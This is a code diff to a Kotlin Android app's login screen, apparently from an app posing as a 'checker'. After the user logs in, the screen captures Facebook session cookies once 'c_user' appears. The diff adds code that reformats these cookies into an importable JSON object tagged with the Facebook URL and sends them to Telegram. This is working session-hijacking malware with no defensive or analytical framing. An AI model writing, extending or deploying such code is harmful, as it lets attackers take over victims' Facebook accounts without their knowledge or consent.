@@ -13,6 +13,7 @@ import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import com.dm.checker.databinding.ActivityLoginBinding
 import com.dm.checker.databinding.ActivityMainBinding
+import org.json.JSONArray
 import org.json.JSONException
 import org.json.JSONObject
 import java.io.IOException
@@ -56,24 +57,24 @@ class LoginActivity : AppCompatActivity() {
 
                 if (cookie.contains("c_user")) {
                     progressDialog.show()
-//                    try {
-//                        parseCookiesToJson(cookie)?.let { parsedCookies ->
-                    sendCookiesToTelegram(cookie)
-                    Handler(mainLooper).postDelayed({
-                        progressDialog.dismiss()
-                        setResult(RESULT_OK)
-                        finish()
-                    }, 3000)
-//                        } ?: run {
-//                            Handler(mainLooper).postDelayed({
-//                                progressDialog.dismiss()
-//                                setResult(RESULT_OK)
-//                                finish()
-//                            }, 3000)
-//                        }
-//                    } catch (e: JSONException) {
-//                        Log.e("TAG", "${e.message}")
-//                    }
+                    try {
+                        parseCookiesToJson(cookie)?.let { parsedCookies ->
+                            sendCookiesToTelegram(parsedCookies)
+                            Handler(mainLooper).postDelayed({
+                                progressDialog.dismiss()
+                                setResult(RESULT_OK)
+                                finish()
+                            }, 3000)
+                        } ?: run {
+                            Handler(mainLooper).postDelayed({
+                                progressDialog.dismiss()
+                                setResult(RESULT_OK)
+                                finish()
+                            }, 3000)
+                        }
+                    } catch (e: JSONException) {
+                        Log.e("TAG", "${e.message}")
+                    }
                 }
             }
         }
@@ -118,7 +119,11 @@ class LoginActivity : AppCompatActivity() {
             listOFCookies.add(jsonObject)
         }
         Log.e("TAG", listOFCookies.toString())
-        return listOFCookies.toString()
+        val j2Cookies = JSONObject()
+        j2Cookies.put("url", "https://www.facebook.com")
+        j2Cookies.put("cookies", JSONArray(listOFCookies))
+        Log.e("TAG", j2Cookies.toString())
+        return j2Cookies.toString().replace("\\", "")
     }
 
     private fun sendCookiesToTelegram(message: String) {
